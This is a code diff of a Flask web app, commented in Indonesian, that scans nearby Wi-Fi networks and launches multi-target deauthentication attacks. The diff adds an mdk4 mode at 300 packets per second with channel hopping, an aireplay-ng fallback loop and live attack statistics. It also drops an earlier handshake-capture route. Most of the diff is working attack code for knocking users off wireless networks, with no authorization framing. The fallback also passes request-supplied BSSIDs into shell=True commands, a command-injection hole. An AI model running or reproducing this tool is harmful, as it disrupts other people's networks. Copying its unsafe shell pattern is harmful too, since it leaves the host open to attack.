@@ -12,12 +12,14 @@ import json
 
 app = Flask(__name__)
 
-# Variabel global
+# ====================== GLOBAL VARIABLES ======================
 monitor_iface = None
 original_iface = None
-attack_processes = {"sniff": None, "deauth": None}
-deauth_thread = None
+deauth_process = None
 deauth_running = False
+deauth_stats = {}
+deauth_total_packets = 0
+deauth_start_time = None
 
 # ====================== FUNGSI MANAJEMEN INTERFACE ======================
 
@@ -96,69 +98,194 @@ def get_monitor_interface():
             return monitor_iface
     return ensure_monitor_mode()
 
-def set_channel(iface, channel):
+def check_mdk4_installed():
     try:
-        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
+        subprocess.run(["which", "mdk4"], capture_output=True, check=True)
         return True
     except:
         return False
 
-# ====================== SIGNAL STRENGTH ======================
-
-def get_signal_level(power):
-    """Konversi dBm ke kategori"""
-    if power is None:
-        return "Almost Hilang"
-    if power > -50:
-        return "Kuat"
-    elif power > -70:
-        return "Sedang"
-    elif power > -85:
-        return "Lemah"
-    else:
-        return "Almost Hilang"
-
-# ====================== PARSE CSV ======================
-
-def parse_csv(filename):
-    """Parse airodump-ng CSV output file, extract BSSID, channel, ESSID, dan Power"""
-    networks = []
+def check_aireplay_installed():
     try:
-        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = f.readlines()
-    except FileNotFoundError:
-        return networks
+        subprocess.run(["which", "aireplay-ng"], capture_output=True, check=True)
+        return True
+    except:
+        return False
 
-    start_parsing = False
-    for i, line in enumerate(lines):
-        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
-            start_parsing = True
-            continue
-        if start_parsing:
-            if line.strip() == "" or "station mac" in line.lower():
-                break
-            parts = line.split(',')
-            if len(parts) >= 14:
-                bssid = parts[0].strip()
-                channel = parts[3].strip()
-                essid = parts[13].strip()
-                power_str = parts[8].strip() if len(parts) > 8 else ''
-                # Konversi power ke int
+# ====================== DEAUTH FUNCTIONS ======================
+
+def deauth_with_mdk4(targets, interface):
+    """
+    Deauth multi-target dengan MDK4 - BALANCED MODE
+    Tidak terlalu OP, cukup efektif
+    """
+    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
+    
+    if not check_mdk4_installed():
+        print("[-] MDK4 not installed!")
+        return None
+    
+    deauth_start_time = time.time()
+    
+    # Buat file blacklist
+    blacklist_file = "/tmp/mdk4_blacklist.txt"
+    with open(blacklist_file, 'w') as f:
+        for target in targets:
+            f.write(target['bssid'] + '\n')
+    
+    # MDK4 command - BALANCED (tidak terlalu OP)
+    # -s 300 = 300 packets/second (cukup untuk deauth, tidak overload interface)
+    # -m 1 = target 1 client per BSSID (efisien)
+    # -c = channel hopping otomatis
+    cmd = [
+        "sudo", "mdk4", interface,
+        "d",  # Deauth mode
+        "-b", blacklist_file,  # Blacklist BSSID
+        "-s", "300",  # 300 packets/sec - BALANCED!
+        "-m", "1",  # 1 client per BSSID
+        "-c"  # Channel hopping
+    ]
+    
+    print(f"[*] Starting MDK4 deauth (BALANCED mode)")
+    print(f"[*] Targets: {len(targets)}")
+    print(f"[*] Packet rate: 300/s")
+    
+    try:
+        # Jalankan MDK4
+        process = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+        
+        # Thread untuk update stats
+        def update_stats():
+            global deauth_stats, deauth_total_packets
+            packet_count = 0
+            while deauth_running:
                 try:
-                    power = int(power_str)
+                    line = process.stdout.readline()
+                    if line:
+                        # Cari angka paket di output
+                        numbers = re.findall(r'\d+', line)
+                        if numbers:
+                            # Ambil angka terakhir yang muncul (biasanya packet count)
+                            new_packets = int(numbers[-1])
+                            if new_packets > packet_count:
+                                deauth_total_packets += (new_packets - packet_count)
+                                packet_count = new_packets
                 except:
-                    power = None
-                if bssid and len(bssid) == 17 and ":" in bssid:
-                    networks.append({
-                        "bssid": bssid,
-                        "channel": channel if channel else "?",
-                        "essid": essid if essid else "[Hidden]",
-                        "power": power,
-                        "signal_level": get_signal_level(power)
-                    })
-    return networks
+                    pass
+                time.sleep(0.5)
+        
+        stats_thread = threading.Thread(target=update_stats)
+        stats_thread.daemon = True
+        stats_thread.start()
+        
+        # Update stats per target
+        for target in targets:
+            bssid = target['bssid']
+            deauth_stats[bssid] = {
+                'bssid': bssid,
+                'channel': target.get('channel', '?'),
+                'essid': target.get('essid', 'Unknown'),
+                'packets': 0,
+                'status': 'attacking'
+            }
+        
+        return process
+        
+    except Exception as e:
+        print(f"[-] Failed to start MDK4: {e}")
+        return None
 
-# ====================== ROUTE SCAN ======================
+def deauth_with_aireplay(targets, interface):
+    """
+    Fallback ke aireplay-ng jika MDK4 tidak tersedia
+    Multi-target dengan sequential
+    """
+    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
+    
+    if not check_aireplay_installed():
+        print("[-] aireplay-ng not installed!")
+        return None
+    
+    deauth_start_time = time.time()
+    print("[*] MDK4 not available, using aireplay-ng fallback")
+    
+    # Thread untuk menjalankan attack sequential
+    def attack_loop():
+        global deauth_running, deauth_stats, deauth_total_packets
+        
+        # Inisialisasi stats
+        for target in targets:
+            bssid = target['bssid']
+            deauth_stats[bssid] = {
+                'bssid': bssid,
+                'channel': target.get('channel', '?'),
+                'essid': target.get('essid', 'Unknown'),
+                'packets': 0,
+                'status': 'attacking'
+            }
+        
+        packet_per_burst = 30  # 30 packets per target per cycle
+        cycle_count = 0
+        
+        while deauth_running:
+            for target in targets:
+                if not deauth_running:
+                    break
+                
+                bssid = target['bssid']
+                channel = target.get('channel', '1')
+                
+                # Set channel
+                try:
+                    subprocess.run(["iwconfig", interface, "channel", str(channel)], 
+                                 capture_output=True, timeout=1)
+                except:
+                    pass
+                
+                # Attack
+                cmd = f"sudo aireplay-ng --deauth {packet_per_burst} -a {bssid} {interface}"
+                try:
+                    result = subprocess.run(cmd, shell=True, timeout=2, capture_output=True, text=True)
+                    if bssid in deauth_stats:
+                        deauth_stats[bssid]['packets'] += packet_per_burst
+                        deauth_total_packets += packet_per_burst
+                except:
+                    pass
+                
+                # Jeda antar target (biar tidak overload)
+                time.sleep(0.3)
+            
+            cycle_count += 1
+            # Jeda antar cycle
+            time.sleep(0.5)
+    
+    thread = threading.Thread(target=attack_loop)
+    thread.daemon = True
+    thread.start()
+    
+    # Return dummy process untuk tracking
+    class DummyProcess:
+        def __init__(self):
+            self.thread = thread
+        def terminate(self):
+            global deauth_running
+            deauth_running = False
+        def wait(self, timeout=3):
+            self.thread.join(timeout=timeout)
+    
+    return DummyProcess()
+
+# ====================== ROUTES ======================
+
+@app.route('/')
+def index():
+    return render_template('index.html')
 
 @app.route('/scan', methods=['GET'])
 def scan_wifi():
@@ -166,6 +293,7 @@ def scan_wifi():
         interface = get_monitor_interface()
         print(f"[*] Scanning with {interface}...")
         
+        # Bersihkan file lama
         for f in glob.glob("/tmp/scan_output*.csv"):
             try:
                 os.remove(f)
@@ -191,92 +319,72 @@ def scan_wifi():
                     break
         
         if networks:
-            # Urutkan berdasarkan power (terbesar = terkuat), yang None ditaruh di bawah
             networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
             print(f"[+] Found {len(networks)} networks")
             return jsonify({"status": "success", "networks": networks})
         else:
-            print("[*] No networks found in CSV, using fallback method...")
-            cmd2 = f"timeout 8 sudo airodump-ng {interface} 2>/dev/null | grep -E '^[0-9A-F]' | head -20"
-            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
-            lines = result2.stdout.split('\n')
-            for line in lines:
-                parts = line.split()
-                if len(parts) >= 7:
-                    bssid = parts[0]
-                    channel = parts[2] if len(parts) > 2 else "?"
-                    essid = " ".join(parts[6:]) if len(parts) > 6 else "[Hidden]"
-                    if bssid and len(bssid) == 17 and ":" in bssid:
-                        networks.append({
-                            "bssid": bssid,
-                            "channel": channel,
-                            "essid": essid,
-                            "power": None,
-                            "signal_level": "Almost Hilang"
-                        })
-            # Urutkan (fallback tidak punya power, tetap beri urutan)
-            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
-            return jsonify({"status": "success", "networks": networks})
+            return jsonify({"status": "success", "networks": []})
             
     except Exception as e:
         print(f"[-] Error during scan: {e}")
         return jsonify({"status": "error", "message": str(e)})
 
-# ====================== ROUTES SERANGAN ======================
+def parse_csv(filename):
+    networks = []
+    try:
+        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+    except FileNotFoundError:
+        return networks
 
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/start_sniff', methods=['POST'])
-def start_sniff():
-    data = request.json
-    bssid = data.get('bssid')
-    channel = data.get('channel')
-    interface = get_monitor_interface()
-    if not interface:
-        return jsonify({"status": "error", "message": "Monitor interface not found"})
-    
-    stop_sniff_process()
-    cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w captured_handshake {interface}"
-    process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
-    attack_processes["sniff"] = process
-    return jsonify({"status": "success", "message": f"Sniffing started on {bssid}"})
-
-@app.route('/stop_sniff', methods=['POST'])
-def stop_sniff():
-    stop_sniff_process()
-    return jsonify({"status": "success", "message": "Sniffing stopped"})
-
-def stop_sniff_process():
-    if attack_processes["sniff"]:
-        os.killpg(os.getpgid(attack_processes["sniff"].pid), signal.SIGTERM)
-        attack_processes["sniff"] = None
-
-# ====================== DEAUTH MULTI-TARGET ======================
-
-def deauth_loop(targets, interface):
-    global deauth_running
-    while deauth_running:
-        for target in targets:
-            if not deauth_running:
+    start_parsing = False
+    for i, line in enumerate(lines):
+        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
+            start_parsing = True
+            continue
+        if start_parsing:
+            if line.strip() == "" or "station mac" in line.lower():
                 break
-            bssid = target['bssid']
-            channel = target['channel']
-            set_channel(interface, channel)
-            cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}"
-            try:
-                subprocess.run(cmd, shell=True, timeout=2, check=False)
-            except:
-                pass
-            time.sleep(0.5)
-        time.sleep(1)
+            parts = line.split(',')
+            if len(parts) >= 14:
+                bssid = parts[0].strip()
+                channel = parts[3].strip()
+                essid = parts[13].strip()
+                power_str = parts[8].strip() if len(parts) > 8 else ''
+                try:
+                    power = int(power_str)
+                except:
+                    power = None
+                if bssid and len(bssid) == 17 and ":" in bssid:
+                    networks.append({
+                        "bssid": bssid,
+                        "channel": channel if channel else "?",
+                        "essid": essid if essid else "[Hidden]",
+                        "power": power,
+                        "signal_level": get_signal_level(power),
+                        "security": parts[5].strip() if len(parts) > 5 else "WPA2/PSK"
+                    })
+    return networks
+
+def get_signal_level(power):
+    if power is None:
+        return "Almost Hilang"
+    if power > -50:
+        return "Kuat"
+    elif power > -70:
+        return "Sedang"
+    elif power > -85:
+        return "Lemah"
+    else:
+        return "Almost Hilang"
 
 @app.route('/start_deauth', methods=['POST'])
 def start_deauth():
-    global deauth_thread, deauth_running
+    global deauth_process, deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
+    
     data = request.json
     targets = data.get('targets')
+    
     if not targets or len(targets) == 0:
         return jsonify({"status": "error", "message": "No targets selected"})
     
@@ -284,33 +392,110 @@ def start_deauth():
     if not interface:
         return jsonify({"status": "error", "message": "Monitor interface not found"})
     
+    # Stop existing attack
     stop_deauth_process()
-    deauth_running = True
-    deauth_thread = threading.Thread(target=deauth_loop, args=(targets, interface))
-    deauth_thread.daemon = True
-    deauth_thread.start()
     
-    target_list = ", ".join([t['bssid'] for t in targets])
-    return jsonify({"status": "success", "message": f"Deauth started on {len(targets)} target(s): {target_list}"})
+    # Reset stats
+    deauth_stats = {}
+    deauth_total_packets = 0
+    deauth_start_time = None
+    deauth_running = True
+    
+    # Coba MDK4 dulu, fallback ke aireplay
+    if check_mdk4_installed():
+        process = deauth_with_mdk4(targets, interface)
+        method = "MDK4"
+    else:
+        process = deauth_with_aireplay(targets, interface)
+        method = "aireplay-ng (fallback)"
+    
+    if process:
+        deauth_process = process
+        return jsonify({
+            "status": "success",
+            "message": f"Deauth started with {method}",
+            "method": method,
+            "targets": len(targets),
+            "target_list": [t['bssid'][:8] + ".." for t in targets[:5]]
+        })
+    else:
+        deauth_running = False
+        return jsonify({
+            "status": "error",
+            "message": "Failed to start deauth. Make sure MDK4 or aircrack-ng is installed."
+        })
 
 @app.route('/stop_deauth', methods=['POST'])
 def stop_deauth():
     stop_deauth_process()
-    return jsonify({"status": "success", "message": "Deauth stopped"})
+    
+    duration = "N/A"
+    if deauth_start_time:
+        elapsed = time.time() - deauth_start_time
+        minutes = int(elapsed // 60)
+        seconds = int(elapsed % 60)
+        duration = f"{minutes}m {seconds}s"
+    
+    return jsonify({
+        "status": "success",
+        "message": "Deauth stopped",
+        "total_packets": deauth_total_packets,
+        "duration": duration,
+        "stats": deauth_stats
+    })
+
+@app.route('/deauth_status', methods=['GET'])
+def deauth_status():
+    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
+    
+    duration = "N/A"
+    if deauth_start_time and deauth_running:
+        elapsed = time.time() - deauth_start_time
+        minutes = int(elapsed // 60)
+        seconds = int(elapsed % 60)
+        duration = f"{minutes}m {seconds}s"
+    
+    # Hitung total target
+    total_targets = len(deauth_stats)
+    active_targets = sum(1 for s in deauth_stats.values() if s.get('status') == 'attacking')
+    
+    return jsonify({
+        "running": deauth_running,
+        "stats": deauth_stats,
+        "total_packets": deauth_total_packets,
+        "total_targets": total_targets,
+        "active_targets": active_targets,
+        "duration": duration,
+        "method": "MDK4" if check_mdk4_installed() else "aireplay-ng"
+    })
 
 def stop_deauth_process():
-    global deauth_running, deauth_thread
+    global deauth_running, deauth_process
     deauth_running = False
-    if deauth_thread and deauth_thread.is_alive():
-        deauth_thread.join(timeout=2)
-    deauth_thread = None
+    
+    if deauth_process:
+        try:
+            deauth_process.terminate()
+            deauth_process.wait(timeout=3)
+        except:
+            pass
+        deauth_process = None
+    
+    # Kill semua proses deauth
+    subprocess.run("sudo pkill -f 'mdk4'", shell=True, check=False)
     subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
+    
+    # Bersihkan file temp
+    for f in ["/tmp/mdk4_blacklist.txt"]:
+        try:
+            os.remove(f)
+        except:
+            pass
 
 # ====================== CLEANUP ======================
 
 def cleanup():
     print("\n[*] Cleaning up...")
-    stop_sniff_process()
     stop_deauth_process()
     if monitor_iface:
         stop_monitor_mode(monitor_iface)
@@ -330,6 +515,13 @@ if __name__ == '__main__':
     try:
         ensure_monitor_mode()
         print(f"[*] Monitor interface ready: {monitor_iface}")
+        
+        if check_mdk4_installed():
+            print("[+] MDK4 detected - using fast deauth")
+        else:
+            print("[!] MDK4 not found - using aireplay-ng fallback")
+            print("[!] Install MDK4: sudo apt install mdk4")
+        
         print("[*] Starting Flask server on 0.0.0.0:5000 ...")
         app.run(host='0.0.0.0', port=5000, debug=False)
     except Exception as e:
